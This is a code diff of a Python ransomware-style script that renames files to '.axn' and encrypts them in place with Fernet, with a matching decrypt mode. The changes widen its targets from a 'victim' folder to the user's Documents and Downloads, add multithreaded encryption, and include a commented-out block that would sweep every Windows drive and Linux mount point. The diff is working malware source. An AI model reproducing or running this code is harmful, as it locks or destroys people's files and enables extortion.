@@ -1,36 +1,72 @@
 import os
 import json
+import threading
 from datetime import datetime
 import random
 from cryptography.fernet import Fernet
 
 EXTENSIONS_FILE = "extensions.json"
+KEY_FILE = "encryption.key"
 
 
-# 🔥 Denver module logic directly in the script
-def gen_key():
-    """Generate a random encryption key."""
-    return Fernet.generate_key().decode('utf-8')
+# 🔥 Key management
+def generate_key():
+    """Generate a Fernet encryption key and save it to a file."""
+    key = Fernet.generate_key()
+    with open(KEY_FILE, "wb") as f:
+        f.write(key)
+    return key
 
 
-def encrypt(data, key):
-    """Encrypt data using Fernet."""
-    f = Fernet(key.encode('utf-8'))
-    encrypted = f.encrypt(data)
-    return encrypted, key
+def load_key():
+    """Load encryption key from the file."""
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "rb") as f:
+            return f.read()
+    else:
+        return generate_key()
 
 
-def decrypt(data, key):
-    """Decrypt data using Fernet."""
+# 🔒 Encryption & Decryption Functions
+def encrypt_file(file_path, key):
+    """Encrypt a file."""
     try:
-        f = Fernet(key.encode('utf-8'))
-        decrypted = f.decrypt(data)
-        return decrypted
-    except Exception:
-        return None
+        with open(file_path, "rb") as f:
+            data = f.read()
+
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+
+        with open(file_path, "wb") as f:
+            f.write(encrypted)
+        
+        print(f"    ✅ Encrypted: {file_path}")
+
+    except Exception as e:
+        print(f"    ❌ Error encrypting {file_path}: {e}")
 
 
-# ✅ File handling functions
+def decrypt_file(file_path, key, original_ext):
+    """Decrypt a file."""
+    try:
+        with open(file_path, "rb") as f:
+            encrypted_data = f.read()
+
+        fernet = Fernet(key)
+        decrypted = fernet.decrypt(encrypted_data)
+
+        with open(file_path, "wb") as f:
+            f.write(decrypted)
+
+        # Restore original extension
+        restored_path = change_extension(file_path, original_ext.lstrip('.'))
+        print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
+
+    except Exception as e:
+        print(f"    ❌ Decryption failed: {file_path} - {e}")
+
+
+# 🔧 Utility Functions
 def load_extensions():
     """Load previous file extensions from JSON."""
     if os.path.exists(EXTENSIONS_FILE):
@@ -53,7 +89,7 @@ def change_extension(file_path, new_extension):
     new_file_name = f"{base}.{new_extension.lstrip('.')}"
     new_file_path = os.path.join(dir_name, new_file_name)
 
-    # Add timestamp/random suffix if conflict occurs
+    # Avoid conflicts
     if os.path.exists(new_file_path):
         timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
         random_suffix = random.randint(1000, 9999)
@@ -64,101 +100,59 @@ def change_extension(file_path, new_extension):
     return new_file_path
 
 
-# ✅ Main Execution
-key = gen_key()
-print(f"🔑 Generated Encryption Key: {key}")
-
-# Load previous extensions
-original_ext = load_extensions()
-
 # 📂 Target directories
 directories_to_process = [
-    os.path.join(os.path.expanduser("~"), "Desktop", "victim")
+    os.path.join(os.path.expanduser("~"), "Desktop", "victim"),
+    os.path.join(os.path.expanduser("~"), "Documents"),
+    os.path.join(os.path.expanduser("~"), "Downloads")
 ]
 
-# 🔒 Encrypt Files
+# # Add other drives (Windows-specific)
+# if os.name == 'nt':
+#     import string
+#     drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
+#     directories_to_process.extend(drives)
+# else:
+#     directories_to_process.extend([
+#         "/mnt", "/media", "/run/media"
+#     ])
+
+
+# 🔒 Main Execution with Multithreading
+key = load_key()
+original_ext = load_extensions()
+
+threads = []
+
+# 🔥 Encrypt or Decrypt based on user input
+action = input("Enter 'e' to encrypt or 'd' to decrypt: ").strip().lower()
+
 for directory in directories_to_process:
     if os.path.exists(directory):
         for root, _, files in os.walk(directory):
-            print(f"\n📂 Processing Directory: {root}")
-
             for file in files:
                 file_path = os.path.join(root, file)
-                _, ext = os.path.splitext(file_path)
+                _, ext = os.path.splitext(file)
 
-                # Skip already encrypted files
-                if ext == ".axn":
-                    print(f"    🔒 Skipping: {file_path} (Already encrypted)")
-                    continue
+                if action == "e":
+                    if ext != ".axn":
+                        new_file_path = change_extension(file_path, "axn")
+                        original_ext[new_file_path] = ext
+                        save_extensions(original_ext)
 
-                # Store original extension
-                try:
-                    new_file_path = change_extension(file_path, "axn")
-                    original_ext[new_file_path] = ext
-                    save_extensions(original_ext)
+                        thread = threading.Thread(target=encrypt_file, args=(new_file_path, key))
+                        thread.start()
+                        threads.append(thread)
 
-                    # Encrypt content in binary mode
-                    with open(new_file_path, "rb") as f:
-                        content = f.read()
+                elif action == "d" and ext == ".axn":
+                    original_extension = original_ext.get(file_path, ".txt")
 
-                    encrypted_content, k = encrypt(content, key)
+                    thread = threading.Thread(target=decrypt_file, args=(file_path, key, original_extension))
+                    thread.start()
+                    threads.append(thread)
 
-                    # Write encrypted content in binary mode
-                    with open(new_file_path, "wb") as f:
-                        f.write(encrypted_content)
+# Wait for all threads to finish
+for thread in threads:
+    thread.join()
 
-                    print(f"    ✅ Encrypted: {file_path} ➝ {new_file_path}")
-
-                except PermissionError:
-                    print(f"    ❌ Permission denied: {file_path} (Skipping...)")
-                except Exception as e:
-                    print(f"    ❌ Error: {e}")
-
-# 🔓 Decryption loop
-while True:
-    action = input("\nEnter 'd' to decrypt or 'q' to quit: ").strip().lower()
-
-    if action == "d":
-        user_key = input("🔑 Enter Decryption Key: ").strip()
-
-        for directory in directories_to_process:
-            if os.path.exists(directory):
-                for root, _, files in os.walk(directory):
-                    print(f"\n📂 Decrypting in Directory: {root}")
-
-                    for file in files:
-                        file_path = os.path.join(root, file)
-
-                        # Only process `.axn` files
-                        if not file_path.endswith(".axn"):
-                            continue
-
-                        try:
-                            # Read encrypted content in binary mode
-                            with open(file_path, "rb") as f:
-                                encrypted_content = f.read()
-
-                            # Decrypt
-                            decrypted_content = decrypt(encrypted_content, user_key)
-
-                            if decrypted_content:
-                                # Write decrypted content
-                                with open(file_path, "wb") as f:
-                                    f.write(decrypted_content)
-
-                                # Restore original extension
-                                original_extension = original_ext.get(file_path, ".txt")
-                                restored_path = change_extension(file_path, original_extension.lstrip("."))
-
-                                print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
-                            else:
-                                print(f"    ❌ Incorrect key. Skipping {file_path}")
-
-                        except PermissionError:
-                            print(f"    ❌ Permission denied: {file_path} (Skipping...)")
-                        except Exception as e:
-                            print(f"    ❌ Error: {e}")
-
-    elif action == "q":
-        print("👋 Exiting...")
-        break
+print("\n✅ Operation completed!")
